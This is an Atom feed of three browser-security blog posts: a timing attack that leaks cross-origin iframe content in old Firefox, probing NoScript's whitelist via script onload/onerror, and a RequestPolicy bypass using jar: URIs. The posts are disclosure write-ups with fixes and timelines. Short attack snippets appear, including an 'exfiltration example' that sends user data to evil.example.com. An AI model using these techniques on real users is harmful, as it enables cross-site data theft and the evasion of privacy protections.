<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Defined Misbehaviour]]></title>
  <link href="http://JordanMilne.github.io/atom.xml" rel="self"/>
  <link href="http://JordanMilne.github.io/"/>
  <updated>2014-02-05T22:19:00-04:00</updated>
  <id>http://JordanMilne.github.io/</id>
  <author>
    <name><![CDATA[Jordan Milne]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[What's That Smell? Sniffing Cross-origin Frame Content in Firefox]]></title>
    <link href="http://JordanMilne.github.io/2014/02/05/whats-that-smell-sniffing-cross-origin-frames-in-firefox/"/>
    <updated>2014-02-05T10:12:13-04:00</updated>
    <id>http://JordanMilne.github.io/2014/02/05/whats-that-smell-sniffing-cross-origin-frames-in-firefox</id>
    <content type="html"><![CDATA[<p>Reading the blogs of <a href="http://lcamtuf.blogspot.com">lcamtuf</a> and <a href="http://scarybeastsecurity.blogspot.ca/">Chris Evans</a> is really what got me interested in browser security,
so I&rsquo;m always on the lookout for novel cross-domain data theft vectors. Today I&rsquo;m going to go into
the discovery and exploitation of such a bug: A timing attack on Firefox&rsquo;s <code>document.elementFromPoint</code> and <code>document.caretPositionFromPoint</code> implementations.</p>

<a name="Initial.Discovery"></a>
<h1>Initial Discovery</h1>

<p>I was looking at ways to automatically exploit another bug that required user interaction when I noticed <a href="https://developer.mozilla.org/en-US/docs/Web/API/document.elementFromPoint">elementFromPoint</a> and
<a href="https://developer.mozilla.org/en-US/docs/Web/API/document.caretPositionFromPoint">caretPositionFromPoint</a> on the MDN.
Curious as to how they behaved with frames, I did a little testing.</p>

<p>I made an example page to test:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;&lt;body&gt;</span>
</span><span class='line'>    <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">&quot;testFrame&quot;</span> <span class="na">src=</span><span class="s">&quot;http://cbc.ca&quot;</span> <span class="na">width=</span><span class="s">&quot;1025&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</span><span class='line'><span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>elementFromPoint(x,y)</code> behaved exactly as I expected, when used in the web console it returned the iframe on my page:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">elementFromPoint</span><span class="p">(</span><span class="nx">frame</span><span class="p">.</span><span class="nx">offsetLeft</span> <span class="o">+</span> <span class="mi">10</span><span class="p">,</span> <span class="nx">frame</span><span class="p">.</span><span class="nx">offsetTop</span> <span class="o">+</span> <span class="mi">10</span><span class="p">))</span>
</span><span class='line'><span class="o">&lt;</span> <span class="p">[</span><span class="nx">object</span> <span class="nx">HTMLIFrameElement</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>caretPositionFromPoint(x,y)</code>, however, was returning elements from the page on cbc.ca!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">caretPositionFromPoint</span><span class="p">(</span><span class="nx">frame</span><span class="p">.</span><span class="nx">offsetLeft</span> <span class="o">+</span> <span class="mi">10</span><span class="p">,</span> <span class="nx">frame</span><span class="p">.</span><span class="nx">offsetTop</span> <span class="o">+</span> <span class="mi">10</span><span class="p">))</span>
</span><span class='line'><span class="o">&lt;</span> <span class="p">[</span><span class="nx">object</span> <span class="nx">CaretPosition</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://JordanMilne.github.io/images/posts/frompoint/obj_inspector.png"><img class="center" src="http://JordanMilne.github.io/images/posts/frompoint/obj_inspector.png"></a></p>

<p>But there was a small snag: I couldn&rsquo;t actually access the <code>CaretPosition</code>&rsquo;s <code>offsetNode</code> from JS without getting a security exception.
It seems that Firefox noticed that <code>offsetNode</code> was being set to an element from a cross-origin document, and wrapped the <code>CaretPosition</code> object
so that I couldn&rsquo;t access any of its members from <em>my</em> document. Great.</p>

<p>However, I found I <em>could</em> access <code>offsetNode</code> when it was set to null. <code>offsetNode</code> seems to be set to null when the topmost
element at a given point is a button, and that includes scrollbar thumbs. That&rsquo;s great for us, because knowing the size and location of the frame&rsquo;s scrollbar thumb
tells us how large the framed document is, and also allows us to leak which elements exist on the page.</p>

<p>For example here&rsquo;s what we can infer about <a href="https://tomcat.apache.org/tomcat-5.5-doc/ssl-howto.html#Create_a_local_Certificate_Signing_Request_(CSR)">https://tomcat.apache.org/tomcat-5.5-doc/ssl-howto.html#Create_a_local_Certificate_Signing_Request_(CSR)</a> through its scrollbars:</p>

<p><a href="http://JordanMilne.github.io/images/posts/frompoint/nullity_test.png"><img class="center" src="http://JordanMilne.github.io/images/posts/frompoint/nullity_test.png" width="600" height="600"></a></p>

<p>The vertical scrollbar thumb has obviously moved, so we know that an element with an id of <code>Create_a_local_Certificate_Signing_Request_(CSR)</code> exists in the framed document.</p>

<p>The following function is used to test <code>offsetNode</code> accessibility at a given point in the document:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">isOffsetNodeAccessibleAt</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>      <span class="nb">document</span><span class="p">.</span><span class="nx">caretPositionFromPoint</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">).</span><span class="nx">offsetNode</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<a name="Digging.Deeper"></a>
<h1>Digging Deeper</h1>

<p>Knowing the page&rsquo;s size and whether certain elements are present is nice, but I wanted more. I remembered <a href="http://contextis.co.uk/research/white-papers/pixel-perfect-timing-attacks-html5/">Paul Stone&rsquo;s excellent paper about timing attacks on browser renderers</a> and figured a timing attack might help us here.</p>

<p><code>caretPositionFromPoint</code> has to do hit testing on the document to determine what the topmost element is at a given point,
and I figured that&rsquo;s not likely to be a constant time operation. It was also clear that hit testing <em>was</em> being performed on cross-origin frame contents, since <code>caretPositionFromPoint</code> was returning elements from them.
I guessed that the time it took for a <code>caretPositionFromPoint(x,y)</code> call to return would leak information about the element at <code>(x,y)</code>.</p>

<p>To test my theory I made a script that runs <code>caretPositionFromPoint(x,y)</code> on a given point 50 times, then stores the median time that the call took to complete. Using the median is important so we can eliminate timing differences due to unrelated factors, like CPU load at the time of the call.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">timeToFindPoint</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// window. getter is slow, apparently.</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">perf</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">performance</span><span class="p">;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c1">// Run caretPositionFromPoint() NUM_SAMPLES times and store runtime for each call.</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">runTimes</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">NUM_SAMPLES</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">NUM_SAMPLES</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kd">var</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">perf</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
</span><span class='line'>      <span class="nb">document</span><span class="p">.</span><span class="nx">caretPositionFromPoint</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">runTimes</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">perf</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="nx">start</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c1">// Return the median runtime for the call</span>
</span><span class='line'>  <span class="nx">runTimes</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span> <span class="p">[],</span> <span class="nx">runTimes</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">runTimes</span><span class="p">.</span><span class="nx">sort</span><span class="p">();</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">return</span> <span class="nx">runTimes</span><span class="p">[(</span><span class="nx">NUM_SAMPLES</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">|</span> <span class="mi">0</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once we&rsquo;ve gathered timing measurements for all of the points across the iframe, we can make a visualization of the differences:</p>

<p><a href="http://JordanMilne.github.io/images/posts/frompoint/reltime.png"><img class="center" src="http://JordanMilne.github.io/images/posts/frompoint/reltime.png" width="600" height="600"></a></p>

<p>Neat.</p>

<p>You can see a number of things in the timing data: the bounding boxes of individual elements, how the lines of text wrap, the position of the bullets in the list, etc.</p>

<p>It also seems that even though <code>elementFromPoint</code> doesn&rsquo;t return elements from the framed document, it still descends into it for its hit testing, so it&rsquo;s vulnerable to
the same timing attack as <code>caretPositionFromPoint</code>.</p>

<a name="Stealing.Text"></a>
<h1>Stealing Text</h1>

<p>So we can infer quite a bit about the framed document from the timing information, but can we actually steal text from it? Maybe, with a lot of work, depending on the page&rsquo;s styling.</p>

<p>I&rsquo;d hoped that <code>caretPositionFromPoint</code>&rsquo;s real purpose (determining what character index the caret should be at for a given point) would yield large enough timing differences to leak the width of individual characters, but that didn&rsquo;t seem to be the case.</p>

<p>Since we can tell how wide a line of text is, we can <a href="http://sirdarckcat.blogspot.com/2013/09/matryoshka-wrapping-overflow-leak-on.html#victim2">extract text using a similar method to sirdarckcat&rsquo;s</a>. First we measure how long the line is, then we make the iframe more narrow to force the text to wrap, then we subtract the new width of the the line from the old width, giving us the width of the word that just wrapped.</p>

<p>Since most sites use variable-width fonts (&ldquo;O&rdquo; and &ldquo;i&rdquo; are different widths on this blog, for example,) small words have distinct widths that make them easy to pick out. With longer words, there may be a number of valid words with that width, however an attacker may be able to determine what word fits best using the context of the surrounding words.</p>

<p>Note that since we need to force text wrapping to get these measurements, it&rsquo;s harder to steal text from fixed-width pages, or pages that display a horizontal scrollbar instead of wrapping text (like <code>view-source:</code> URIs.) Pages that use fixed-width fonts are also more difficult to analyze because characters do not have distinct widths, we can only determine the number of characters in a word.</p>

<a name="Working.Examples"></a>
<h1>Working Examples</h1>

<p>Note that the last Firefox version these actually work in is <code>26</code>, if you want to try them out you&rsquo;ll have to find a download for it.</p>

<ul>
<li><a href="http://saynotolinux.com/tests/moz_frompoint/crossorigin_auto_domsniff_nullity.html">caretPositionFromPoint accessibility PoC</a></li>
<li><a href="http://saynotolinux.com/tests/moz_frompoint/crossorigin_auto_domsniff.html">*FromPoint timing attack PoC</a></li>
</ul>


<a name="The.Fix"></a>
<h1>The Fix</h1>

<p>Judging from <a href="https://hg.mozilla.org/mozilla-central/rev/cdbe5779c728">Robert O&#8217;Callahan&rsquo;s fix</a>, it looks like Firefox was using a general hit testing function that descended cross document for both <code>elementFromPoint</code> and <code>caretPositionFromPoint</code>. The fix was to disable cross-document descent in the hit testing function when called by either <code>elementFromPoint</code> or <code>caretPositionFromPoint</code>.</p>

<a name="Disclosure.Timeline"></a>
<h1>Disclosure Timeline</h1>

<ul>
<li>Dec. 11 2013: Discovered <code>caretPositionFromPoint</code> leaked info through <code>offsetNode</code> accessibility</li>
<li>Dec. 13 2013: Notified Mozilla</li>
<li>Dec. 13 2013: Mozilla responds</li>
<li>Dec. 15 2013: Discovered timing info leaks in both <code>elementFromPoint</code> and <code>caretPositionFromPoint</code></li>
<li>Dec. 16 2013: Sent update to Mozilla</li>
<li>Dec. 16 2013: Mozilla responds</li>
<li>Dec. 18 2013: <a href="https://hg.mozilla.org/mozilla-central/rev/cdbe5779c728">Fix committed</a></li>
<li>Jan. 16 2014: Fix pushed to Beta channel</li>
<li>Feb. 04 2014: Fix pushed to Stable channel and <a href="https://www.mozilla.org/security/announce/2014/mfsa2014-05.html">advisory posted</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing NoScript's Global Whitelist Rules to Reveal Trusted Sites (the Easy Way)]]></title>
    <link href="http://JordanMilne.github.io/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/"/>
    <updated>2013-12-18T03:58:17-04:00</updated>
    <id>http://JordanMilne.github.io/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way</id>
    <content type="html"><![CDATA[<p>Here&rsquo;s one that&rsquo;s been <a href="http://www.w2spconf.com/2011/papers/jspriv.pdf">covered a bit before</a>: <a href="http://noscript.net/">NoScript</a> makes it easy for whitelisted sites to see what other sites are on the whitelist.</p>

<h2>So what&#8217;s the issue?</h2>


<p>Most of the pertinent info is in the previous paper, but I&rsquo;ll give a brief summary. By default NoScript operates in whitelist mode, forbidding scripts from all domains. Once a site has been added to the whitelist, scripts from that domain <em>as well as those included from other whitelisted domains</em> may be executed on the page.</p>

<p>NoScript&rsquo;s default whitelist is fairly small, and users don&rsquo;t generally
share sets of whitelist rules (like with Adblock Plus,) so if a
site is whitelisted the user must have used or
visited that site.</p>

<p>Since the only whitelist is a global one (allowing scripts to run <em>on</em> facebook.com also allows other whitelisted domains to execute scripts <em>from</em> facebook.com,) whitelisted sites may infer what other sites are on the whitelist by including scripts from other domains and checking whether or not they execute.</p>

<p>The method described in the paper involves finding a valid script file on the domain you want to test and observing its side effects (modifications to the <code>window</code> object or the DOM.) This can be tedious for an attacker, and requires a bit of manual work. It may also pollute the DOM / <code>window</code> object with junk and break our testing code!</p>

<p>Luckily, there&rsquo;s an easier way. <a href="https://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">Mike Cardwell describes</a> a method of determining if a cross-origin resource returned a 200 status code using <code>&lt;script&gt;</code> tags. The <code>&lt;script&gt;</code> tag&rsquo;s <code>onload</code> handler will trigger on a successful HTTP status code, and the <code>onerror</code> handler will trigger otherwise. The <code>&lt;script&gt;</code> tag&rsquo;s <code>onload</code> handler will trigger <em>even if</em> the resource isn&rsquo;t a valid script.</p>

<p>The same method may be used to determine if NoScript has blocked a resource that would normally return a 200 HTTP status code. <code><a href="http://domain.tld/">http://domain.tld/</a></code> usually returns HTML with a 200 status code, so that&rsquo;s a pretty good candidate for testing.</p>

<p>For example:</p>

<figure class='code'><figcaption><span>onload/onerror example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;http://google.com&quot;</span> <span class="na">onload=</span><span class="s">&quot;javascript:alert(&#39;google loaded&#39;)&quot;</span> <span class="na">onerror=</span><span class="s">&quot;javascript:alert(&#39;google failed&#39;)&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you have google.com whitelisted, this will say &ldquo;google loaded!&rdquo;. Otherwise (or if google.com is down for some reason) this will print &ldquo;google failed&rdquo;.</p>

<h2>
Cool, let&#8217;s see it in action!&nbsp;</h2>


<p><a href="http://saynotolinux.com/tests/noscript/whitelist_disclosure.html">Here&rsquo;s an example</a> of how the attack may be used, including a timing attack based on the <a href="http://blog.saynotolinux.com/2013/11/bypassing-requestpolicys-whitelist.html">RequestPolicy bypass described in my last post</a>. Mind, the timing attack is a bit spotty, and generally doesn&rsquo;t work on
the first page load. Refresh the page if it doesn&rsquo;t work the first time.</p>

<p>If you don&rsquo;t have either RequestPolicy or NoScript installed, here&rsquo;s what you should see:</p>

<p><a href="http://JordanMilne.github.io/images/posts/whitelist-disclosure.png"><img src="http://JordanMilne.github.io/images/posts/whitelist-disclosure.png"></a></p>

<h2>How can it be fixed?</h2>


<p>Global whitelist entries by their very nature leak info to any other site on the whitelist. This won&rsquo;t be fixed in NoScript until support for per-site whitelists is added and people are encouraged to remove their old global rules.</p>

<p>In the meantime, using a <a href="https://github.com/JordanMilne/requestpolicy">patched RequestPolicy</a> will give you a per-site whitelist for <em>all</em> cross-domain requests, effectively mitigating the issue.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bypassing RequestPolicy's Whitelist Using the Jar: URI Scheme]]></title>
    <link href="http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/"/>
    <updated>2013-11-29T04:11:39-04:00</updated>
    <id>http://JordanMilne.github.io/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme</id>
    <content type="html"><![CDATA[<p>Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.
It&rsquo;s possible to bypass <a href="https://www.requestpolicy.com/about.html">RequestPolicy</a>&rsquo;s whitelist entirely by referencing a resource nested in a <a href="http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/">jar URI</a>:</p>

<figure class='code'><figcaption><span>Exfiltration example</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;jar:http://evil.example.com/logger?userdata=whatever!/foobar&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Firefox will block the resource from being displayed even if it is
valid (due to prior security issues with the jar URI scheme,) but a
cross-domain request is made and it doesn&rsquo;t require JS to execute. This
can be verified through the network pane in Firefox&rsquo;s dev tools. A limited amount of information <em>may</em> be sent back from the server by using timing information.</p>

<p>Requests to jar URIs don&rsquo;t get processed by RequestPolicy because <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1953">aContentLocation&rsquo;s asciiHost is undefined</a> when the jar URI scheme is used, and <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1962">it gets treated as an internal request</a>.
Since all <a href="https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L2035">internal requests are implicitly allowed</a>, the request goes through.</p>

<p>I emailed Justin the patch a few months ago, but he hasn&rsquo;t responded.
 Hopefully this gets fixed on the addons.mozilla.org version soon, since
 it limits RequestPolicy&rsquo;s effectiveness at preventing data exfiltration.</p>

<p>For now, you can use <a href="https://github.com/JordanMilne/requestpolicy">my fork of RequestPolicy</a>.
I&rsquo;m not sure if the patch has any interactions with extensions, but it should also fix issues with
nested use of the view-source scheme (which for some reason doesn&rsquo;t implement <a href="http://dxr.mozilla.org/mozilla-central/source/netwerk/base/public/nsINestedURI.idl">nsINestedURI</a>)</p>

<h3>Proof-of-Concept</h3>


<p>If you&rsquo;d like to see whether or not you&rsquo;re vulnerable, <a href="http://saynotolinux.com/tests/requestpolicy_jar.html">I&rsquo;ve made a Proof-of-Concept</a> that detects whether or not RequestPolicy blocked an image from a jar URI.</p>

<p>Without the patch:</p>

<p><a href="http://JordanMilne.github.io/images/posts/jar-broken.png"><img src="http://JordanMilne.github.io/images/posts/jar-broken.png"></a></p>

<p>With the patch:</p>

<p><a href="http://JordanMilne.github.io/images/posts/jar-fixed.png"><img src="http://JordanMilne.github.io/images/posts/jar-fixed.png"></a></p>
]]></content>
  </entry>
  
</feed>
